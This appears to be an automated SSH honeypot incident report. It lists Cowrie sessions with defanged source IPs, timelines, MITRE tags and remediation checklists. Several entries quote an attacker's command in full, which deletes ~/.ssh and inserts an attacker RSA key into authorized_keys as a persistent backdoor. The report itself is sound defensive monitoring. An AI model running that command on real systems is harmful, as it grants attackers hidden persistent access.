### 🔴 HIGH · IR-d1e1b2efff75

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-29 09:15 |
| **Last Seen** | 2026-09-29 09:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:15:46` | `cowrie.session.connect` |
| `2026-09-29 09:15:46` | `cowrie.client.version` |
| `2026-09-29 09:15:46` | `cowrie.client.kex` |
| `2026-09-29 09:15:46` | `cowrie.login.success` |
| `2026-09-29 09:15:47` | `cowrie.direct-tcpip.request` |
| `2026-09-29 09:15:47` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 09:15:47` | `cowrie.direct-tcpip.data` |
| `2026-09-29 09:15:48` | `cowrie.direct-tcpip.request` |
| `2026-09-29 09:15:48` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 09:15:48` | `cowrie.direct-tcpip.data` |
| `2026-09-29 09:15:48` | `cowrie.direct-tcpip.request` |
| `2026-09-29 09:15:48` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 09:15:48` | `cowrie.direct-tcpip.data` |
| `2026-09-29 09:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fefd9d29cb3

| Field | Detail |
|---|---|
| **Source IP** | `115.190.197[.]74` |
| **First Seen** | 2026-09-29 09:22 |
| **Last Seen** | 2026-09-29 09:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:22:04` | `cowrie.session.connect` |
| `2026-09-29 09:22:04` | `cowrie.client.version` |
| `2026-09-29 09:22:06` | `cowrie.client.kex` |
| `2026-09-29 09:22:07` | `cowrie.login.success` |
| `2026-09-29 09:22:08` | `cowrie.session.params` |
| `2026-09-29 09:22:08` | `cowrie.command.input` |
| `2026-09-29 09:22:08` | `cowrie.command.failed` |
| `2026-09-29 09:22:08` | `cowrie.log.closed` |
| `2026-09-29 09:22:09` | `cowrie.session.params` |
| `2026-09-29 09:22:09` | `cowrie.command.input` |
| `2026-09-29 09:22:10` | `cowrie.session.file_download` |
| `2026-09-29 09:22:10` | `cowrie.log.closed` |
| `2026-09-29 09:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.197[.]74` to AbuseIPDB if not already reported
- [ ] Block `115.190.197[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6da9070731c4

| Field | Detail |
|---|---|
| **Source IP** | `115.190.197[.]74` |
| **First Seen** | 2026-09-29 09:22 |
| **Last Seen** | 2026-09-29 09:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:22:10` | `cowrie.session.connect` |
| `2026-09-29 09:22:10` | `cowrie.client.version` |
| `2026-09-29 09:22:10` | `cowrie.client.kex` |
| `2026-09-29 09:22:11` | `cowrie.login.success` |
| `2026-09-29 09:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.197[.]74` to AbuseIPDB if not already reported
- [ ] Block `115.190.197[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-468032938f58

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]10` |
| **First Seen** | 2026-09-29 09:23 |
| **Last Seen** | 2026-09-29 09:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:23:04` | `cowrie.session.connect` |
| `2026-09-29 09:23:04` | `cowrie.client.version` |
| `2026-09-29 09:23:04` | `cowrie.client.kex` |
| `2026-09-29 09:23:04` | `cowrie.login.success` |
| `2026-09-29 09:23:05` | `cowrie.session.params` |
| `2026-09-29 09:23:05` | `cowrie.command.input` |
| `2026-09-29 09:23:05` | `cowrie.command.failed` |
| `2026-09-29 09:23:05` | `cowrie.log.closed` |
| `2026-09-29 09:23:06` | `cowrie.session.params` |
| `2026-09-29 09:23:06` | `cowrie.command.input` |
| `2026-09-29 09:23:06` | `cowrie.session.file_download` |
| `2026-09-29 09:23:06` | `cowrie.log.closed` |
| `2026-09-29 09:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]10` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ab7119c84b

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]10` |
| **First Seen** | 2026-09-29 09:23 |
| **Last Seen** | 2026-09-29 09:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:23:06` | `cowrie.session.connect` |
| `2026-09-29 09:23:06` | `cowrie.client.version` |
| `2026-09-29 09:23:06` | `cowrie.client.kex` |
| `2026-09-29 09:23:06` | `cowrie.login.success` |
| `2026-09-29 09:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]10` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4cdccddfa9b

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-09-29 09:30 |
| **Last Seen** | 2026-09-29 09:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:30:06` | `cowrie.session.connect` |
| `2026-09-29 09:30:06` | `cowrie.client.version` |
| `2026-09-29 09:30:06` | `cowrie.client.kex` |
| `2026-09-29 09:30:07` | `cowrie.login.success` |
| `2026-09-29 09:30:08` | `cowrie.session.params` |
| `2026-09-29 09:30:08` | `cowrie.command.input` |
| `2026-09-29 09:30:08` | `cowrie.command.failed` |
| `2026-09-29 09:30:09` | `cowrie.log.closed` |
| `2026-09-29 09:30:10` | `cowrie.session.params` |
| `2026-09-29 09:30:10` | `cowrie.command.input` |
| `2026-09-29 09:30:10` | `cowrie.session.file_download` |
| `2026-09-29 09:30:10` | `cowrie.log.closed` |
| `2026-09-29 09:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44f80859bdb

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-09-29 09:30 |
| **Last Seen** | 2026-09-29 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:30:10` | `cowrie.session.connect` |
| `2026-09-29 09:30:10` | `cowrie.client.version` |
| `2026-09-29 09:30:11` | `cowrie.client.kex` |
| `2026-09-29 09:30:12` | `cowrie.login.success` |
| `2026-09-29 09:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1bd365184d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-29 09:34 |
| **Last Seen** | 2026-09-29 09:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 09:34:04` | `cowrie.session.connect` |
| `2026-09-29 09:34:04` | `cowrie.client.version` |
| `2026-09-29 09:34:05` | `cowrie.client.kex` |
| `2026-09-29 09:34:05` | `cowrie.login.success` |
| `2026-09-29 09:34:08` | `cowrie.direct-tcpip.request` |
| `2026-09-29 09:34:09` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 09:34:09` | `cowrie.direct-tcpip.data` |
| `2026-09-29 09:34:09` | `cowrie.direct-tcpip.request` |
| `2026-09-29 09:34:11` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 09:34:11` | `cowrie.direct-tcpip.data` |
| `2026-09-29 09:34:11` | `cowrie.direct-tcpip.request` |
| `2026-09-29 09:34:12` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 09:34:12` | `cowrie.direct-tcpip.data` |
| `2026-09-29 09:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd378b39425

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-29 10:11 |
| **Last Seen** | 2026-09-29 10:11 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:11:35` | `cowrie.session.connect` |
| `2026-09-29 10:11:35` | `cowrie.client.version` |
| `2026-09-29 10:11:35` | `cowrie.client.kex` |
| `2026-09-29 10:11:35` | `cowrie.login.success` |
| `2026-09-29 10:11:41` | `cowrie.direct-tcpip.request` |
| `2026-09-29 10:11:42` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 10:11:42` | `cowrie.direct-tcpip.data` |
| `2026-09-29 10:11:44` | `cowrie.direct-tcpip.request` |
| `2026-09-29 10:11:45` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 10:11:45` | `cowrie.direct-tcpip.data` |
| `2026-09-29 10:11:45` | `cowrie.direct-tcpip.request` |
| `2026-09-29 10:11:47` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 10:11:47` | `cowrie.direct-tcpip.data` |
| `2026-09-29 10:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d292ca400f0

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-29 10:12 |
| **Last Seen** | 2026-09-29 10:12 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:12:09` | `cowrie.session.connect` |
| `2026-09-29 10:12:09` | `cowrie.client.version` |
| `2026-09-29 10:12:09` | `cowrie.client.kex` |
| `2026-09-29 10:12:10` | `cowrie.login.success` |
| `2026-09-29 10:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a8ffe923fe

| Field | Detail |
|---|---|
| **Source IP** | `218.90.33[.]83` |
| **First Seen** | 2026-09-29 10:26 |
| **Last Seen** | 2026-09-29 10:31 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:26:16` | `cowrie.session.connect` |
| `2026-09-29 10:26:16` | `cowrie.client.version` |
| `2026-09-29 10:26:16` | `cowrie.client.kex` |
| `2026-09-29 10:26:17` | `cowrie.login.success` |
| `2026-09-29 10:26:19` | `cowrie.session.params` |
| `2026-09-29 10:26:19` | `cowrie.command.input` |
| `2026-09-29 10:26:19` | `cowrie.command.failed` |
| `2026-09-29 10:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.90.33[.]83` to AbuseIPDB if not already reported
- [ ] Block `218.90.33[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373d4d362de3

| Field | Detail |
|---|---|
| **Source IP** | `43.135.154[.]242` |
| **First Seen** | 2026-09-29 10:26 |
| **Last Seen** | 2026-09-29 10:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:26:35` | `cowrie.session.connect` |
| `2026-09-29 10:26:35` | `cowrie.client.version` |
| `2026-09-29 10:26:35` | `cowrie.client.kex` |
| `2026-09-29 10:26:35` | `cowrie.login.success` |
| `2026-09-29 10:26:36` | `cowrie.session.params` |
| `2026-09-29 10:26:36` | `cowrie.command.input` |
| `2026-09-29 10:26:36` | `cowrie.command.failed` |
| `2026-09-29 10:26:36` | `cowrie.log.closed` |
| `2026-09-29 10:26:37` | `cowrie.session.params` |
| `2026-09-29 10:26:37` | `cowrie.command.input` |
| `2026-09-29 10:26:37` | `cowrie.session.file_download` |
| `2026-09-29 10:26:37` | `cowrie.log.closed` |
| `2026-09-29 10:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.154[.]242` to AbuseIPDB if not already reported
- [ ] Block `43.135.154[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc84e263c7f8

| Field | Detail |
|---|---|
| **Source IP** | `43.135.154[.]242` |
| **First Seen** | 2026-09-29 10:26 |
| **Last Seen** | 2026-09-29 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:26:37` | `cowrie.session.connect` |
| `2026-09-29 10:26:37` | `cowrie.client.version` |
| `2026-09-29 10:26:37` | `cowrie.client.kex` |
| `2026-09-29 10:26:37` | `cowrie.login.success` |
| `2026-09-29 10:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.154[.]242` to AbuseIPDB if not already reported
- [ ] Block `43.135.154[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e84588d73e

| Field | Detail |
|---|---|
| **Source IP** | `59.16.212[.]232` |
| **First Seen** | 2026-09-29 10:27 |
| **Last Seen** | 2026-09-29 10:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:27:25` | `cowrie.session.connect` |
| `2026-09-29 10:27:25` | `cowrie.client.version` |
| `2026-09-29 10:27:25` | `cowrie.client.kex` |
| `2026-09-29 10:27:26` | `cowrie.login.success` |
| `2026-09-29 10:27:27` | `cowrie.session.params` |
| `2026-09-29 10:27:27` | `cowrie.command.input` |
| `2026-09-29 10:27:27` | `cowrie.command.failed` |
| `2026-09-29 10:27:28` | `cowrie.log.closed` |
| `2026-09-29 10:27:28` | `cowrie.session.params` |
| `2026-09-29 10:27:28` | `cowrie.command.input` |
| `2026-09-29 10:27:29` | `cowrie.session.file_download` |
| `2026-09-29 10:27:29` | `cowrie.log.closed` |
| `2026-09-29 10:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.16.212[.]232` to AbuseIPDB if not already reported
- [ ] Block `59.16.212[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5140c001a3f3

| Field | Detail |
|---|---|
| **Source IP** | `59.16.212[.]232` |
| **First Seen** | 2026-09-29 10:27 |
| **Last Seen** | 2026-09-29 10:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:27:29` | `cowrie.session.connect` |
| `2026-09-29 10:27:29` | `cowrie.client.version` |
| `2026-09-29 10:27:29` | `cowrie.client.kex` |
| `2026-09-29 10:27:30` | `cowrie.login.success` |
| `2026-09-29 10:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.16.212[.]232` to AbuseIPDB if not already reported
- [ ] Block `59.16.212[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3312dc6806

| Field | Detail |
|---|---|
| **Source IP** | `179.32.213[.]29` |
| **First Seen** | 2026-09-29 10:30 |
| **Last Seen** | 2026-09-29 10:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:30:12` | `cowrie.session.connect` |
| `2026-09-29 10:30:12` | `cowrie.client.version` |
| `2026-09-29 10:30:12` | `cowrie.client.kex` |
| `2026-09-29 10:30:12` | `cowrie.login.success` |
| `2026-09-29 10:30:13` | `cowrie.session.params` |
| `2026-09-29 10:30:13` | `cowrie.command.input` |
| `2026-09-29 10:30:13` | `cowrie.command.failed` |
| `2026-09-29 10:30:13` | `cowrie.log.closed` |
| `2026-09-29 10:30:14` | `cowrie.session.params` |
| `2026-09-29 10:30:14` | `cowrie.command.input` |
| `2026-09-29 10:30:14` | `cowrie.session.file_download` |
| `2026-09-29 10:30:14` | `cowrie.log.closed` |
| `2026-09-29 10:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.213[.]29` to AbuseIPDB if not already reported
- [ ] Block `179.32.213[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b31fc3ebb4

| Field | Detail |
|---|---|
| **Source IP** | `179.32.213[.]29` |
| **First Seen** | 2026-09-29 10:30 |
| **Last Seen** | 2026-09-29 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:30:14` | `cowrie.session.connect` |
| `2026-09-29 10:30:14` | `cowrie.client.version` |
| `2026-09-29 10:30:14` | `cowrie.client.kex` |
| `2026-09-29 10:30:14` | `cowrie.login.success` |
| `2026-09-29 10:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.213[.]29` to AbuseIPDB if not already reported
- [ ] Block `179.32.213[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7d011c4970

| Field | Detail |
|---|---|
| **Source IP** | `182.61.33[.]68` |
| **First Seen** | 2026-09-29 10:31 |
| **Last Seen** | 2026-09-29 10:31 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:31:12` | `cowrie.session.connect` |
| `2026-09-29 10:31:12` | `cowrie.client.version` |
| `2026-09-29 10:31:12` | `cowrie.client.kex` |
| `2026-09-29 10:31:13` | `cowrie.login.success` |
| `2026-09-29 10:31:14` | `cowrie.session.params` |
| `2026-09-29 10:31:14` | `cowrie.command.input` |
| `2026-09-29 10:31:14` | `cowrie.command.failed` |
| `2026-09-29 10:31:15` | `cowrie.log.closed` |
| `2026-09-29 10:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.61.33[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.61.33[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff2382d91f68

| Field | Detail |
|---|---|
| **Source IP** | `182.61.33[.]68` |
| **First Seen** | 2026-09-29 10:31 |
| **Last Seen** | 2026-09-29 10:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 10:31:43` | `cowrie.session.connect` |
